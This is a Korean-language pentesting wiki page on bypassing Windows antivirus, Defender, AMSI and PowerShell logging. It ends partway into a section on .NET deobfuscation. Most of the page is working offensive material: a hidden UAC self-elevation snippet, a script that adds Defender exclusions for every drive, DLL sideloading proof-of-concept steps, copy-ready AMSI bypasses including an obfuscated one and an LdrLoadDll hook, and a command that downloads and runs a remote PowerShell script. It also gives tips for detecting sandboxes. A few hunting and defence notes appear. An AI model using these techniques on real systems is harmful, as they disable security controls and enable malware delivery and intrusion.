# Antivirus (AV) 우회

{{#include ../banners/hacktricks-training.md}}

**이 페이지는 처음에** [**@m2rc_p**](https://twitter.com/m2rc_p)**가 작성했습니다!**

## Defender 중지

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender가 작동하지 않도록 중지하는 도구입니다.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV인 것처럼 위장해 Windows Defender가 작동하지 않도록 중지하는 도구입니다.
- [관리자 권한으로 Defender 비활성화](basic-powershell-for-pentesters/README.md)

### Defender 변조 전 설치 프로그램 스타일의 UAC 유도

게임 치트로 위장한 공개 로더는 서명되지 않은 Node.js/Nexe 설치 프로그램 형태로 배포되는 경우가 많으며, 먼저 **사용자에게 권한 상승을 요청한 다음** Defender를 무력화합니다. 동작 방식은 간단합니다.

1. `net session`으로 관리자 컨텍스트인지 확인합니다. 이 명령은 호출자에게 관리자 권한이 있을 때만 성공하므로, 실패하면 로더가 표준 사용자로 실행 중임을 나타냅니다.
2. 원래 명령줄을 유지한 채 `RunAs` 동사로 즉시 자신을 다시 실행해 예상된 UAC 동의 프롬프트를 표시합니다.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

피해자는 이미 “크랙된” 소프트웨어를 설치한다고 믿고 있으므로, 보통 프롬프트를 수락해 malware가 Defender 정책을 변경하는 데 필요한 권한을 얻습니다.<sup>[[26]](#references)</sup>

### 모든 드라이브 문자에 대한 일괄 `MpPreference` 제외

권한을 상승시킨 뒤, GachiLoader 스타일의 체인은 서비스를 완전히 비활성화하는 대신 Defender의 사각지대를 최대한 넓힙니다. 먼저 로더는 GUI watchdog을 종료한 다음 (`taskkill /F /IM SecHealthUI.exe`), 모든 사용자 프로필, 시스템 디렉터리, 이동식 디스크를 검사할 수 없도록 **매우 광범위한 제외 항목**을 추가합니다:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

주요 관찰 사항:

- 루프는 마운트된 모든 파일 시스템(D:\, E:\, USB 스틱 등)을 순회하므로 **디스크 어디에든 나중에 저장되는 payload는 모두 무시됩니다**.
- `.sys` 확장자 제외는 향후를 대비한 조치입니다. 공격자는 나중에 Defender를 다시 건드리지 않고 서명되지 않은 드라이버를 로드할 수 있는 선택지를 남겨둡니다.
- 모든 변경 사항은 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 아래에 적용되므로, 이후 단계에서 제외 항목이 계속 유지되는지 확인하거나 UAC를 다시 트리거하지 않고 확장할 수 있습니다.

Defender 서비스가 중지되지 않으므로, 단순한 상태 점검에서는 실제 검사에서 해당 경로가 제외되어 있어도 “antivirus active”라고 계속 보고합니다.<sup>[[26]](#references)</sup>

## **AV Evasion 방법론**

현재 AV는 파일이 악성인지 확인하기 위해 정적 탐지, 동적 분석, 그리고 더 고급 EDR의 경우 행동 분석 등 다양한 방법을 사용합니다.

### **정적 탐지**

정적 탐지는 바이너리나 스크립트에서 알려진 악성 문자열 또는 바이트 배열을 찾아 표시하고, 파일 자체에서 정보(예: 파일 설명, 회사 이름, 디지털 서명, 아이콘, 체크섬 등)를 추출하는 방식으로 이루어집니다. 따라서 알려진 공개 도구를 사용하면 분석되어 악성으로 표시되었을 가능성이 높아 더 쉽게 탐지될 수 있습니다. 이러한 탐지를 우회하는 방법은 몇 가지가 있습니다.

- **암호화**

바이너리를 암호화하면 AV가 프로그램을 탐지할 방법이 없어지지만, 프로그램을 복호화해 메모리에서 실행할 loader가 필요합니다.

- **난독화**

때로는 바이너리나 스크립트의 문자열 일부를 바꾸는 것만으로 AV 탐지를 피할 수 있지만, 난독화하려는 내용에 따라 시간이 오래 걸릴 수 있습니다.

- **커스텀 도구**

직접 도구를 개발하면 알려진 악성 시그니처가 없겠지만, 많은 시간과 노력이 필요합니다.

> [!TIP]
> Windows Defender의 정적 탐지 여부를 확인하는 좋은 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)를 사용하는 것입니다. 파일을 여러 세그먼트로 나눈 다음 Defender가 각각을 개별적으로 검사하도록 하므로, 바이너리에서 어떤 문자열이나 바이트가 표시되는지 정확히 알려줍니다.

실제 AV Evasion에 관한 [YouTube 재생목록](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)을 꼭 확인해 보시기 바랍니다.

### **동적 분석**

동적 분석은 AV가 바이너리를 sandbox에서 실행하고 악성 행위(예: 브라우저 비밀번호를 복호화해 읽으려는 시도, LSASS의 minidump 수행 등)를 감시하는 방식입니다. 이 부분은 다루기 조금 까다로울 수 있지만, sandbox를 우회하기 위해 할 수 있는 몇 가지 방법이 있습니다.

- **실행 전 대기** 구현 방식에 따라 AV의 동적 분석을 우회하는 좋은 방법이 될 수 있습니다. AV는 사용자의 작업 흐름을 방해하지 않도록 파일을 검사할 시간이 매우 짧으므로, 긴 대기 시간을 사용하면 바이너리 분석을 방해할 수 있습니다. 다만 AV sandbox 중 상당수는 구현 방식에 따라 대기 과정을 건너뛸 수 있습니다.
- **머신 리소스 확인** 일반적으로 sandbox는 사용자의 머신을 느리게 만들지 않도록 사용할 수 있는 리소스가 매우 제한적입니다(예: RAM < 2GB). 여기서 더 창의적인 방법을 쓸 수도 있습니다. 예를 들어 CPU 온도나 팬 속도를 확인할 수 있습니다. sandbox에서 모든 항목을 구현하지는 않습니다.
- **머신별 확인** "contoso.local" 도메인에 가입된 사용자의 워크스테이션을 대상으로 삼으려면 컴퓨터의 도메인이 지정한 값과 일치하는지 확인할 수 있습니다. 일치하지 않으면 프로그램을 종료하면 됩니다.

Microsoft Defender의 sandbox 컴퓨터 이름은 HAL9TH인 것으로 알려져 있습니다. 따라서 실행되기 전에 malware에서 컴퓨터 이름을 확인할 수 있습니다. 이름이 HAL9TH와 일치하면 Defender의 sandbox 안에 있다는 뜻이므로 프로그램을 종료하면 됩니다.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>출처: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox 대응에 관한 [@mgeeky](https://twitter.com/mariuszbit)의 다른 유용한 팁입니다.

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 채널</p></figcaption></figure>

이 게시물에서 앞서 말했듯이 **공개 도구**는 결국 **탐지됩니다**. 따라서 스스로에게 다음과 같이 질문해야 합니다.

예를 들어 LSASS를 덤프하려는 경우, **정말 mimikatz를 사용해야 할까요**? 아니면 덜 알려졌으면서 LSASS도 덤프할 수 있는 다른 프로젝트를 사용할 수 있을까요?

아마 후자가 정답일 것입니다. mimikatz를 예로 들면, AV와 EDR이 가장 많이 표시하는 malware 중 하나이며, 어쩌면 가장 많이 표시하는 malware일 수도 있습니다. 프로젝트 자체는 매우 훌륭하지만 AV를 우회하도록 수정하기는 악몽과도 같으므로, 원하는 작업을 수행할 대안을 찾아보세요.

> [!TIP]
> 회피를 위해 payload를 수정할 때는 Defender의 **자동 샘플 제출을 끄고**, 장기적으로 회피를 달성하려는 것이 목적이라면 **절대로 VIRUSTOTAL에 업로드하지 마세요**. 특정 AV가 payload를 탐지하는지 확인하려면 VM에 해당 AV를 설치하고, 자동 샘플 제출을 끄고, 결과에 만족할 때까지 그 안에서 테스트하세요.

## EXE와 DLL

가능하다면 회피를 위해 항상 **DLL 사용을 우선하세요**. 제 경험상 DLL 파일은 보통 **탐지 및 분석 빈도가 훨씬 낮으므로**, payload를 DLL로 실행할 방법이 있다면 일부 상황에서 탐지를 피하는 매우 간단한 방법이 될 수 있습니다.

이 이미지에서 볼 수 있듯이 Havoc의 DLL Payload는 antiscan.me에서 탐지율이 4/26인 반면, EXE payload의 탐지율은 7/26입니다.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>일반 Havoc EXE payload와 일반 Havoc DLL을 antiscan.me에서 비교</p></figcaption></figure>

이제 DLL 파일을 사용해 훨씬 더 은밀하게 실행할 수 있는 몇 가지 기법을 살펴보겠습니다.

## DLL Sideloading & Proxying

**DLL Sideloading**은 loader가 사용하는 DLL 검색 순서를 활용합니다. 이를 위해 취약한 애플리케이션과 악성 payload를 나란히 배치합니다.

[ Siofra](https://github.com/Cybereason/siofra)와 다음 PowerShell 스크립트를 사용하면 DLL Sideloading에 취약한 프로그램을 확인할 수 있습니다.

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

이 명령은 "C:\Program Files\\" 내에서 DLL hijacking에 취약한 프로그램 목록과 해당 프로그램이 로드하려는 DLL 파일을 출력합니다.

**DLL Hijackable/Sideloadable 프로그램을 직접 찾아보는 것을** 강력히 권장합니다. 제대로 수행하면 이 기법은 꽤 은밀하지만, 공개적으로 알려진 DLL Sideloadable 프로그램을 사용하면 쉽게 적발될 수 있습니다.

프로그램이 로드하려는 이름으로 악성 DLL을 배치하는 것만으로는 payload가 로드되지 않습니다. 프로그램은 해당 DLL에 특정 함수가 있을 것으로 예상하기 때문입니다. 이 문제를 해결하기 위해 **DLL Proxying/Forwarding**이라는 기법을 사용합니다.

**DLL Proxying**은 프로그램이 proxy DLL(악성 DLL)에 보내는 호출을 원본 DLL로 전달합니다. 이를 통해 프로그램의 기능을 유지하면서 payload의 실행도 처리할 수 있습니다.

[@flangvik](https://twitter.com/Flangvik/)의 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 프로젝트를 사용하겠습니다.

다음은 제가 수행한 단계입니다:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

마지막 명령을 실행하면 DLL 소스 코드 템플릿과 이름이 변경된 원본 DLL, 두 개의 파일이 생성됩니다.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

These는 결과입니다:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

우리의 shellcode([SGN](https://github.com/EgeBalci/sgn)으로 인코딩)와 proxy DLL 모두 [antiscan.me](https://antiscan.me)에서 Detection rate가 0/26입니다! 성공이라고 할 수 있겠네요.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading에 대해 다룬 [S3cur3Th1sSh1t의 twitch VOD](https://www.twitch.tv/videos/1644171543)를 시청하고, 더 심도 있게 알아보려면 [ippsec의 영상](https://www.youtube.com/watch?v=3eROsG_WNpE)도 시청할 것을 **강력히 추천합니다**.

### Forwarded Exports 악용 (ForwardSideLoading)

Windows PE 모듈은 실제로는 "forwarder"인 함수를 export할 수 있습니다. 코드 위치를 가리키는 대신, export 항목에 `TargetDll.TargetFunc` 형식의 ASCII 문자열이 들어 있습니다. 호출자가 export를 resolve하면 Windows loader는 다음을 수행합니다.

- `TargetDll`이 아직 로드되지 않았다면 로드합니다.
- 해당 DLL에서 `TargetFunc`를 resolve합니다.

이해해야 할 주요 동작:
- `TargetDll`이 KnownDLL이면 보호된 KnownDLLs namespace(ntdll, kernelbase, ole32 등)에서 제공됩니다.<sup>[[15]](#references)</sup>
- `TargetDll`이 KnownDLL이 아니면, forward resolution을 수행하는 모듈의 디렉터리를 포함하는 일반 DLL search order가 사용됩니다.

이를 통해 간접적인 sideloading 기법을 사용할 수 있습니다. 함수가 non-KnownDLL 모듈 이름으로 forwarded되는 서명된 DLL을 찾은 다음, 해당 서명된 DLL과 함께 forwarded target 모듈과 이름이 정확히 일치하는 공격자 제어 DLL을 배치하면 됩니다. forwarded export가 호출되면 loader가 forward를 resolve하고 같은 디렉터리에서 공격자의 DLL을 로드하여 DllMain을 실행합니다.<sup>[[13]](#references)</sup>

Windows 11에서 관찰된 예:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll`은 KnownDLL이 아니므로 일반 검색 순서를 통해 확인됩니다.

PoC (복사-붙여넣기):
1) 서명된 시스템 DLL을 쓰기 가능한 폴더에 복사합니다.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 같은 폴더에 악성 `NCRYPTPROV.dll`을 배치합니다. 최소한의 DllMain만으로도 code execution이 가능하며, DllMain을 트리거하기 위해 forwarded function을 구현할 필요는 없습니다.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) 서명된 LOLBin으로 forward를 트리거합니다:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (signed)가 side-by-side `keyiso.dll` (signed)을 로드함
- `KeyIsoSetAuditingInterface`를 확인하는 동안 loader가 forward를 따라 `NCRYPTPROV.SetAuditingInterface`로 이동함
- 이후 loader가 `C:\test`에서 `NCRYPTPROV.dll`을 로드하고 해당 DLL의 `DllMain`을 실행함
- `SetAuditingInterface`가 구현되어 있지 않으면 `DllMain`이 이미 실행된 후에야 "missing API" 오류가 발생함

Hunting 팁:
- 대상 module이 KnownDLL이 아닌 forwarded exports를 집중적으로 살펴보세요. KnownDLL은 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 아래에 나열되어 있습니다.
- 다음과 같은 도구를 사용해 forwarded exports를 열거할 수 있습니다:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 후보를 검색하려면 Windows 11 forwarder 인벤토리를 확인하세요: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

탐지/방어 아이디어:
- LOLBins(예: rundll32.exe)이 비시스템 경로에서 서명된 DLL을 로드한 다음, 해당 디렉터리에서 같은 기본 이름을 가진 비-KnownDLL을 로드하는지 모니터링
- 다음과 같은 프로세스/모듈 체인에 경고 설정: `rundll32.exe` → 비시스템 경로의 `keyiso.dll` → 사용자 쓰기 가능 경로의 `NCRYPTPROV.dll`
- 코드 무결성 정책(WDAC/AppLocker)을 적용하고 애플리케이션 디렉터리에서 쓰기+실행을 차단

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze는 일시 중지된 프로세스, direct syscalls, 대체 실행 방식을 사용해 EDR을 우회하기 위한 payload toolkit입니다`

Freeze를 사용하면 stealthy한 방식으로 shellcode를 로드하고 실행할 수 있습니다.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion은 고양이와 쥐의 술래잡기와 같습니다. 오늘 통하는 방법도 내일은 탐지될 수 있으므로, 하나의 도구에만 의존하지 말고 가능하면 여러 Evasion 기법을 연계해 사용하세요.

## 직접/간접 Syscalls 및 SSN 확인 (SysWhispers4)

EDR은 `ntdll.dll`의 syscall stub에 **user-mode inline hook**을 설치하는 경우가 많습니다. 이러한 hook을 우회하려면 올바른 **SSN**(System Service Number)을 로드하고, hook이 걸린 export 진입점을 실행하지 않은 채 kernel mode로 전환하는 **direct** 또는 **indirect** syscall stub을 생성할 수 있습니다.<sup>[[32]](#references)</sup>

**호출 방식:**
- **Direct (embedded)**: 생성된 stub에 `syscall`/`sysenter`/`SVC #0` 명령을 삽입합니다(`ntdll` export에 접근하지 않음).
- **Indirect**: 기존 `ntdll` 내부의 `syscall` gadget으로 점프하여 kernel 전환이 `ntdll`에서 시작된 것처럼 보이게 합니다(heuristic Evasion에 유용). **randomized indirect**는 호출할 때마다 pool에서 gadget을 선택합니다.
- **Egg-hunt**: 디스크에 정적인 `0F 05` opcode 시퀀스를 포함하지 않고, runtime에 syscall 시퀀스를 확인합니다.

**Hook에 강한 SSN 확인 전략:**
- **FreshyCalls (VA sort)**: stub의 바이트를 읽는 대신 syscall stub을 virtual address 순으로 정렬해 SSN을 추론합니다.
- **SyscallsFromDisk**: 깨끗한 `\KnownDlls\ntdll.dll`을 매핑하고 `.text`에서 SSN을 읽은 다음 매핑을 해제합니다(메모리 내 모든 hook을 우회).
- **RecycledGate**: VA 순으로 정렬해 SSN을 추론하고, stub이 깨끗하면 opcode를 검증합니다. hook이 있으면 VA 추론으로 대체합니다.
- **HW Breakpoint**: `syscall` 명령에 DR0을 설정하고 VEH를 사용해 runtime에 `EAX`에서 SSN을 가져옵니다. hook이 걸린 바이트를 파싱하지 않습니다.

SysWhispers4 사용 예:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI는 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"를 방지하기 위해 만들어졌습니다. 처음에는 AV가 **디스크에 있는 파일**만 검사할 수 있었기 때문에, 페이로드를 어떻게든 **메모리에서 직접** 실행할 수 있다면 AV는 이를 방지하기 위해 아무것도 할 수 없었습니다. 가시성이 충분하지 않았기 때문입니다.

AMSI 기능은 다음 Windows 구성 요소에 통합되어 있습니다.

- 사용자 계정 컨트롤(UAC)(EXE, COM, MSI 또는 ActiveX 설치 시 권한 상승)
- PowerShell(스크립트, 대화형 사용 및 동적 코드 평가)
- Windows Script Host(wscript.exe 및 cscript.exe)
- JavaScript 및 VBScript
- Office VBA 매크로

이 기능을 통해 백신 솔루션은 스크립트 내용을 암호화되거나 난독화되지 않은 형태로 노출하여 스크립트 동작을 검사할 수 있습니다.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`를 실행하면 Windows Defender에서 다음 경고가 발생합니다.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` 뒤에 스크립트가 실행된 실행 파일의 경로가 붙는 것을 확인할 수 있습니다. 이 경우에는 powershell.exe입니다.

디스크에 파일을 저장하지 않았지만, AMSI로 인해 메모리에서 실행했는데도 탐지되었습니다.

또한 **.NET 4.8**부터는 C# 코드도 AMSI를 통해 실행됩니다. 이는 메모리에서 실행하기 위한 `Assembly.Load(byte[])`에도 영향을 줍니다. 따라서 AMSI를 우회하려는 경우 메모리에서 실행할 때는 더 낮은 버전의 .NET(예: 4.7.2 이하)을 사용하는 것이 권장됩니다.

AMSI를 우회하는 방법은 몇 가지가 있습니다.

- **Obfuscation**

AMSI는 주로 정적 탐지를 사용하므로, 로드하려는 스크립트를 수정하면 탐지를 피하는 데 효과적일 수 있습니다.

하지만 AMSI는 여러 계층으로 난독화된 스크립트도 역난독화할 수 있으므로, 난독화 방식에 따라서는 좋은 선택이 아닐 수 있습니다. 따라서 우회가 그리 간단하지는 않습니다. 다만 때로는 변수 이름 몇 개만 바꾸면 충분할 수 있으므로, 어느 정도 탐지 대상으로 분류되었는지에 따라 다릅니다.

- **AMSI Bypass**

AMSI는 DLL을 powershell(또는 cscript.exe, wscript.exe 등) 프로세스에 로드하는 방식으로 구현되어 있어, 권한이 낮은 사용자로 실행 중이어도 쉽게 조작할 수 있습니다. 이러한 AMSI 구현상의 결함으로 인해 연구자들은 AMSI 검사를 우회하는 여러 방법을 찾아냈습니다.

**Forcing an Error**

AMSI 초기화(amsiInitFailed)를 실패하게 만들면 현재 프로세스에서 검사가 시작되지 않습니다. 이 방법은 처음에 [Matt Graeber](https://twitter.com/mattifestation)가 공개했으며, Microsoft는 이 방법의 광범위한 사용을 방지하기 위한 시그니처를 개발했습니다.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

PowerShell 코드 한 줄만으로 현재 PowerShell 프로세스에서 AMSI를 사용할 수 없게 만들 수 있었습니다. 물론 이 코드는 AMSI 자체에 의해 탐지되므로, 이 기법을 사용하려면 일부 수정이 필요합니다.

다음은 이 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI bypass입니다.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

이 게시물이 공개되면 아마 표시될 테니, 탐지를 피할 계획이라면 코드를 게시하지 않아야 한다는 점을 기억하세요.

**Memory Patching**

이 기법은 [@RastaMouse](https://twitter.com/_RastaMouse/)가 처음 발견했습니다. 사용자 입력을 검사하는 `AmsiScanBuffer` 함수의 주소를 `amsi.dll`에서 찾아, `E_INVALIDARG` 코드를 반환하는 명령어로 덮어씁니다. 이렇게 하면 실제 검사 결과가 0을 반환하고, 이는 깨끗한 결과로 해석됩니다.

> [!TIP]
> 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)를 읽어보세요.

powershell에서 AMSI를 우회하는 다른 기법도 많이 있습니다. 자세히 알아보려면 [**이 페이지**](basic-powershell-for-pentesters/index.html#amsi-bypass)와 [**이 repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하세요.

### amsi.dll 로드를 방지해 AMSI 차단하기 (LdrLoadDll hook)

AMSI는 `amsi.dll`이 현재 프로세스에 로드된 후에만 초기화됩니다. 견고하고 언어에 구애받지 않는 우회 방법은 `ntdll!LdrLoadDll`에 user-mode hook을 설정해, 요청된 모듈이 `amsi.dll`일 때 오류를 반환하는 것입니다. 그 결과 AMSI가 로드되지 않고 해당 프로세스에서 검사가 수행되지 않습니다.<sup>[[23]](#references)</sup>

구현 개요 (x64 C/C++ 의사 코드):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
참고 사항
- PowerShell, WScript/CScript 및 사용자 지정 로더 등 AMSI를 로드하는 모든 환경에서 작동합니다.
- 긴 명령줄 흔적을 피하려면 스크립트를 stdin으로 전달하는 방법(`PowerShell.exe -NoProfile -NonInteractive -Command -`)과 함께 사용하세요.
- LOLBins를 통해 실행되는 로더에서 사용된 사례가 있습니다(예: `regsvr32`가 `DllRegisterServer`를 호출).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** 도 AMSI를 우회하는 스크립트를 생성합니다.
**[https://amsibypass.com/](https://amsibypass.com/)** 도 사용자 정의 함수, 변수, 문자 표현식을 무작위화하고 PowerShell 키워드의 대소문자를 무작위로 적용해 signature를 피하는 AMSI 우회 스크립트를 생성합니다.

**탐지된 signature 제거**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 및 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 같은 도구를 사용해 현재 프로세스 메모리에서 탐지된 AMSI signature를 제거할 수 있습니다. 이 도구는 현재 프로세스의 메모리를 스캔해 AMSI signature를 찾은 다음 NOP 명령어로 덮어써 메모리에서 제거합니다.

**AMSI를 사용하는 AV/EDR 제품**

AMSI를 사용하는 AV/EDR 제품 목록은 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**에서 확인할 수 있습니다.

**PowerShell 버전 2 사용**
PowerShell 버전 2를 사용하면 AMSI가 로드되지 않으므로 AMSI 검사 없이 스크립트를 실행할 수 있습니다. 다음과 같이 할 수 있습니다:

```bash
powershell.exe -version 2
```

## PS 로깅

PowerShell 로깅은 시스템에서 실행된 모든 PowerShell 명령을 기록할 수 있는 기능입니다. 감사 및 문제 해결에 유용하지만, **탐지를 회피하려는 공격자에게는 문제가 될 수도 있습니다**.

PowerShell 로깅을 우회하려면 다음 기법을 사용할 수 있습니다.

- **PowerShell Transcription 및 Module Logging 비활성화**: 이를 위해 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)와 같은 도구를 사용할 수 있습니다.
- **PowerShell version 2 사용**: PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로, AMSI 검사 없이 스크립트를 실행할 수 있습니다. 다음과 같이 실행하면 됩니다: `powershell.exe -version 2`
- **Unmanaged PowerShell session 사용**: [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)을 사용하면 `powershell.exe`를 실행하지 않고 PowerShell을 호스팅할 수 있습니다(Cobalt Strike의 `powerpick`에서 사용하는 방식). 이 방법은 `powershell.exe` 프로세스에만 연결된 제어를 회피하지만, AMSI, Script Block Logging 또는 다른 모든 PowerShell 방어 기능을 본질적으로 비활성화하지는 않습니다. 적용 범위는 런타임과 호스트 구현에 따라 달라집니다.


## 난독화

> [!TIP]
> 여러 난독화 기법은 데이터를 암호화하는데, 이로 인해 바이너리의 엔트로피가 증가하여 AV와 EDR이 더 쉽게 탐지할 수 있습니다. 이 점에 유의하고, 민감하거나 숨겨야 하는 코드의 특정 부분에만 암호화를 적용하는 것을 고려하세요.

### ConfuserEx로 보호된 .NET 바이너리 역난독화

ConfuserEx 2(또는 상용 포크)를 사용하는 malware를 분석할 때는 디컴파일러와 샌드박스를 차단하는 여러 계층의 보호를 마주치는 경우가 많습니다. 아래 워크플로를 사용하면 **원본에 가까운 IL을 안정적으로 복원**할 수 있으며, 복원 후에는 dnSpy 또는 ILSpy와 같은 도구로 C#을 디컴파일할 수 있습니다.<sup>[[10]](#references)</sup>

1.  Anti-tampering 제거 – ConfuserEx는 모든 *method body*를 암호화하고 *module*의 정적 생성자(`<Module>.cctor`)에서 이를 복호화합니다. 또한 PE checksum을 수정하므로, 바이너리를 변경하면 충돌이 발생합니다. **AntiTamperKiller**를 사용해 암호화된 metadata table을 찾고, XOR key를 복구한 다음 정상적인 assembly를 다시 작성하세요:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output에는 자체 unpacker를 만들 때 유용하게 사용할 수 있는 6개의 anti-tamper parameters(`key0-key3`, `nameHash`, `internKey`)가 포함되어 있습니다.

2.  심볼 / control-flow 복구 – *clean* 파일을 **de4dot-cex**(de4dot의 ConfuserEx-aware fork)에 전달합니다.
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – ConfuserEx 2 프로필 선택
     • de4dot은 control-flow flattening을 되돌리고, 원래의 네임스페이스, 클래스, 변수 이름을 복원하며, 상수 문자열을 복호화합니다.

